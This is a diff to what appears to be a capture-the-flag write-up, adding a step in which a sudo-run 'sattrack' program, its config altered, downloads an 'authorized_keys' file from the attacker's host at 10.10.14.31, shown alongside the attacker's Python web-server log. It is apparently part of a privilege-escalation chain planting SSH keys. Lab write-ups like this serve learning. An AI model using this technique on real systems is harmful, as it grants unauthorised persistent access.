@@ -943,7 +943,7 @@ Config file manipulated:
 
 <br />
 
-Run the program:
+Run the program one more time:
 
 <br />
 
@@ -952,6 +952,18 @@ jovian@jupiter:/usr/local/share/sattrack$ sudo /usr/local/bin/sattrack
 Satellite Tracking System
 Get:0 http://10.10.14.31/authorized_keys
 tlefile is not a valid file
+```
+
+<br />
+
+Receive the GET:
+
+<br />
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.216 - - [27/Mar/2025 22:46:20] "GET /authorized_keys HTTP/1.1" 200 -
 ```
 
 <br />
